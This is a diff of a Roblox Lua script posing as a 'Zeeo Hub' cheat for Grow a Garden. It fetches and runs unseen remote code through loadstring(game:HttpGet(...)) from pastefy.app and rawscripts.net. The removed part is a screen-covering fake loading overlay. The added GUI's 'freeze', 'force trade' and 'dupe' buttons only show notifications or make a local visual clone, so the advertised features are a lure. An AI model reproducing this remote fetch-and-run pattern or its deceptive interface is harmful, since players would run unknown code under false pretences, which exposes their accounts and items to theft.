@@ -1,215 +1,163 @@
 wait("0.2")
 loadstring(game:HttpGet("https://pastefy.app/WkAWQDi9/raw"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-Blackhub-Infinite-Sheckles-41369"))()
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
-local RunService = game:GetService("RunService")
-local camera = workspace.CurrentCamera
+local StarterGui = game:GetService("StarterGui")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
--- Criar ScreenGui
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FullEffectGui"
+screenGui.Name = "ZeeoHubGUI"
 screenGui.ResetOnSpawn = false
-screenGui.DisplayOrder = 3000
-screenGui.IgnoreGuiInset = true
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-screenGui.Parent = PlayerGui
+screenGui.Parent = playerGui
 
--- Torna a GUI não bloqueadora de input
-screenGui.AutoLocalize = false
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 320) -- Increased height for dupe button space
+frame.Position = UDim2.new(0.65, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.fromRGB(10, 10, 50) -- Navy blue
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
 
--- Fundo preto
-local backgroundFrame = Instance.new("Frame")
-backgroundFrame.Position = UDim2.new(0, -100, 0, -100)
-backgroundFrame.Size = UDim2.new(1, 200, 1, 200)
-backgroundFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-backgroundFrame.BorderSizePixel = 0
-backgroundFrame.ZIndex = 10
-backgroundFrame.Active = false
-backgroundFrame.Selectable = false
-backgroundFrame.Parent = screenGui
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.15, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.Text = "Zeeo Hub"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 22
+title.BackgroundTransparency = 1
+title.Parent = frame
 
--- Logo central
-local imageLabel = Instance.new("ImageLabel")
-imageLabel.Size = UDim2.new(0, 256, 0, 256)
-imageLabel.Position = UDim2.new(0.5, -128, 0.5, -178)
-imageLabel.BackgroundTransparency = 1
-imageLabel.Image = "rbxassetid://132263722231080"
-imageLabel.ZIndex = 11
-imageLabel.Active = false
-imageLabel.Selectable = false
-imageLabel.Parent = backgroundFrame
+local usernameBox = Instance.new("TextBox")
+usernameBox.Size = UDim2.new(0.8, 0, 0.15, 0)
+usernameBox.Position = UDim2.new(0.1, 0, 0.2, 0)
+usernameBox.PlaceholderText = "Enter username"
+usernameBox.Text = ""
+usernameBox.Font = Enum.Font.SourceSans
+usernameBox.TextSize = 18
+usernameBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+usernameBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+usernameBox.ClearTextOnFocus = false
+usernameBox.Parent = frame
 
--- Barra de loading
-local loadingBarBackground = Instance.new("Frame")
-loadingBarBackground.Size = UDim2.new(0, 300, 0, 30)
-loadingBarBackground.Position = UDim2.new(0.5, -150, 0.5, 100)
-loadingBarBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-loadingBarBackground.BorderSizePixel = 0
-loadingBarBackground.ZIndex = 12
-loadingBarBackground.Active = false
-loadingBarBackground.Selectable = false
-loadingBarBackground.Parent = backgroundFrame
+local avatarImage = Instance.new("ImageLabel")
+avatarImage.Size = UDim2.new(0, 60, 0, 60)
+avatarImage.Position = UDim2.new(0.5, -30, 0.4, 0)
+avatarImage.BackgroundTransparency = 1
+avatarImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+avatarImage.Parent = frame
 
-local loadingBarBackgroundCorner = Instance.new("UICorner")
-loadingBarBackgroundCorner.CornerRadius = UDim.new(0, 15)
-loadingBarBackgroundCorner.Parent = loadingBarBackground
+local avatarUICorner = Instance.new("UICorner")
+avatarUICorner.CornerRadius = UDim.new(1, 0)
+avatarUICorner.Parent = avatarImage
 
-local loadingBarFill = Instance.new("Frame")
-loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
-loadingBarFill.Position = UDim2.new(0, 0, 0, 0)
-loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
-loadingBarFill.BorderSizePixel = 0
-loadingBarFill.ZIndex = 13
-loadingBarFill.Active = false
-loadingBarFill.Selectable = false
-loadingBarFill.Parent = loadingBarBackground
+local freezeButton = Instance.new("TextButton")
+freezeButton.Size = UDim2.new(0.4, -5, 0.15, 0)
+freezeButton.Position = UDim2.new(0.1, 0, 0.7, 0)
+freezeButton.Text = "🧊 Freeze"
+freezeButton.Font = Enum.Font.SourceSansBold
+freezeButton.TextSize = 16
+freezeButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+freezeButton.Parent = frame
 
-local loadingBarFillCorner = Instance.new("UICorner")
-loadingBarFillCorner.CornerRadius = UDim.new(0, 15)
-loadingBarFillCorner.Parent = loadingBarFill
+local forceButton = Instance.new("TextButton")
+forceButton.Size = UDim2.new(0.4, -5, 0.15, 0)
+forceButton.Position = UDim2.new(0.5, 10, 0.7, 0)
+forceButton.Text = "💪 Force"
+forceButton.Font = Enum.Font.SourceSansBold
+forceButton.TextSize = 16
+forceButton.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+forceButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+forceButton.Parent = frame
 
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(1, 0, 1, 0)
-loadingText.BackgroundTransparency = 1
-loadingText.Text = "Loading Modules Script"
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingText.Font = Enum.Font.GothamBold
-loadingText.TextSize = 18
-loadingText.ZIndex = 14
-loadingText.Active = false
-loadingText.Selectable = false
-loadingText.Parent = loadingBarBackground
-
-local loadingIcon = Instance.new("ImageLabel")
-loadingIcon.Size = UDim2.new(0, 30, 0, 30)
-loadingIcon.BackgroundTransparency = 1
-loadingIcon.Image = "rbxassetid://83198158215351"
-loadingIcon.ZIndex = 15
-loadingIcon.Active = false
-loadingIcon.Selectable = false
-loadingIcon.Parent = loadingBarBackground
-
--- Mensagem no topo
-local topMessage = Instance.new("TextLabel")
-topMessage.Size = UDim2.new(1, 0, 0, 30)
-topMessage.Position = UDim2.new(0, 0, 0, 0)
-topMessage.BackgroundTransparency = 1
-topMessage.Text = ""
-topMessage.TextColor3 = Color3.fromRGB(255, 255, 0)
-topMessage.Font = Enum.Font.GothamBold
-topMessage.TextSize = 20
-topMessage.ZIndex = 16
-topMessage.Active = false
-topMessage.Selectable = false
-topMessage.Parent = screenGui
-
--- Loading animação
-spawn(function()
-    local fillWidth = 0
-    local maxWidth = 300 * 0.99
-    while true do
-        if fillWidth < maxWidth then
-            fillWidth = fillWidth + 0.75
-        else
-            topMessage.Text = "Sorry if the script is taking too long to load. This ensures all modules are loaded properly."
-            topMessage.BackgroundTransparency = 0.5
-            wait(3)
-            for i = 1, 20 do
-                topMessage.TextTransparency = i * 0.05
-                topMessage.TextStrokeTransparency = i * 0.05
-                wait(0.05)
-            end
-            topMessage.Text = ""
-            topMessage.TextTransparency = 0
-            topMessage.TextStrokeTransparency = 0
-            fillWidth = 0
-        end
-        loadingBarFill.Size = UDim2.new(0, fillWidth, 1, 0)
-        loadingIcon.Position = UDim2.new(0, fillWidth - 15, 0, 0)
-        wait(0.03)
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, 0, 0.1, 0)
+footer.Position = UDim2.new(0, 0, 0.9, 0)
+footer.Text = "Enter a username to load avatar"
+footer.TextColor3 = Color3.fromRGB(255, 255, 255)
+footer.Font = Enum.Font.SourceSans
+footer.TextSize = 16
+footer.BackgroundTransparency = 1
+footer.Parent = frame
+local function updateAvatar()
+    local username = usernameBox.Text
+    if username == "" then
+        avatarImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+        return
     end
-end)
 
--- Imagens caindo infinito
-local imageIds = {
-    "rbxassetid://129325487005421",
-    "rbxassetid://128351949256773",
-    "rbxassetid://98316788023886",
-    "rbxassetid://138926938699718",
-    "rbxassetid://120114304521163",
-}
-local totalImages = 20
-local fallSpeedMin, fallSpeedMax = 50, 150
-local images = {}
-
-for i = 1, totalImages do
-    local img = Instance.new("ImageLabel")
-    img.Size = UDim2.new(0, 40, 0, 40)
-    img.BackgroundTransparency = 1
-    img.Image = imageIds[math.random(1, #imageIds)]
-    img.ZIndex = 3000
-    img.AnchorPoint = Vector2.new(0.5, 0.5)
-    img.Active = false
-    img.Selectable = false
-    img.Parent = screenGui
-
-    local startX = math.random(20, camera.ViewportSize.X - 20)
-    local startY = -math.random(50, 100)
-    img.Position = UDim2.new(0, startX, 0, startY)
-
-    table.insert(images, {img = img, speed = math.random(fallSpeedMin, fallSpeedMax)})
-end
-
-RunService.Heartbeat:Connect(function(dt)
-    for _, data in ipairs(images) do
-        local img, speed = data.img, data.speed
-        local newY = img.Position.Y.Offset + speed * dt
-        if newY > camera.ViewportSize.Y + 50 then
-            local newX = math.random(20, camera.ViewportSize.X - 20)
-            newY = -math.random(50, 100)
-            img.Position = UDim2.new(0, newX, 0, newY)
-            img.Image = imageIds[math.random(1, #imageIds)]
-            data.speed = math.random(fallSpeedMin, fallSpeedMax)
-        else
-            img.Position = UDim2.new(0, img.Position.X.Offset, 0, newY)
-        end
-    end
-end)
-
--- Pontos coloridos por toda a tela
-local function createPaintDot()
-    local dot = Instance.new("Frame")
-    dot.Size = UDim2.new(0, math.random(10, 30), 0, math.random(10, 30))
-    dot.BackgroundColor3 = Color3.fromRGB(math.random(100,255), math.random(100,255), math.random(100,255))
-    dot.BorderSizePixel = 0
-    dot.BackgroundTransparency = 1
-    dot.ZIndex = 2000
-    dot.Active = false
-    dot.Selectable = false
-    dot.Parent = screenGui
-
-    local xPos = math.random(0, camera.ViewportSize.X)
-    local yPos = math.random(0, camera.ViewportSize.Y)
-    dot.Position = UDim2.new(0, xPos, 0, yPos)
-
-    spawn(function()
-        for i = 1, 10 do
-            dot.BackgroundTransparency = 1 - i * 0.1
-            wait(0.03)
-        end
-        wait(1)
-        for i = 1, 10 do
-            dot.BackgroundTransparency = i * 0.1
-            wait(0.03)
-        end
-        dot:Destroy()
+    local success, userId = pcall(function()
+        return Players:GetUserIdFromNameAsync(username)
     end)
+
+    if success then
+        local thumbType = Enum.ThumbnailType.HeadShot
+        local thumbSize = Enum.ThumbnailSize.Size100x100
+        local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+        if isReady then
+            avatarImage.Image = content
+        end
+    else
+        avatarImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+    end
 end
 
-spawn(function()
-    while true do
-        createPaintDot()
-        wait(math.random(0.1, 0.3))
+usernameBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        updateAvatar()
+    end
+end)
+
+freezeButton.MouseButton1Click:Connect(function()
+    local name = usernameBox.Text
+    if name == "" then name = "[unknown]" end
+    StarterGui:SetCore("SendNotification", {
+        Title = "Freeze Script";
+        Text = "🧊 Attempting to freeze " .. name;
+        Duration = 3;
+    })
+end)
+
+forceButton.MouseButton1Click:Connect(function()
+    local name = usernameBox.Text
+    if name == "" then name = "[unknown]" end
+    StarterGui:SetCore("SendNotification", {
+        Title = "Force Script";
+        Text = "💪 Forcing trade accept on " .. name;
+        Duration = 3;
+    })
+end)
+local dupeButton = Instance.new("TextButton")
+dupeButton.Size = UDim2.new(0.8, 0, 0, 30)
+dupeButton.Position = UDim2.new(0.1, 0, 1.05, 0) -- Below the frame
+dupeButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10) -- black
+dupeButton.Text = "DUPE"
+dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- white
+dupeButton.TextScaled = true
+dupeButton.Parent = frame
+
+local dupeNote = Instance.new("TextLabel")
+dupeNote.Size = UDim2.new(0.8, 0, 0, 20)
+dupeNote.Position = UDim2.new(0.1, 0, 1.25, 0)
+dupeNote.BackgroundTransparency = 1
+dupeNote.Text = "(only works on fruits/plants)"
+dupeNote.TextColor3 = Color3.fromRGB(200, 200, 200)
+dupeNote.TextScaled = true
+dupeNote.Parent = frame
+
+dupeButton.MouseButton1Click:Connect(function()
+    local character = game.Players.LocalPlayer.Character
+    if not character then return end
+
+    local tool = character:FindFirstChildOfClass("Tool")
+    if tool then
+        local fakeTool = tool:Clone()
+        fakeTool.Parent = character
+        print("Visual dupe performed: " .. tool.Name)
+    else
+        warn("No item in hand to dupe.")
     end
 end)
